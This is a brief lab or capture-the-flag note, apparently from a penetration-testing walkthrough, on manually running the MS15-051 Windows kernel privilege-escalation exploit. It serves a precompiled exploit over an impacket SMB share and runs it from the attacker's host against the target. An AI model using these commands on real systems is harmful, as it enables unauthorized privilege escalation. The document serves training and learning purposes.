Exploit ms15_051 Manually.
#

I grab the compile exploit from this ressource.

windows-kernel-exploits/MS15-051/README.md at master · SecWiki/windows-kernel-exploits

# you need run the smbserver on the same directory to the exploit.
> impacket-smbserver share .

> \\10.10.14.9\share\ms15-051x64.exe whoami
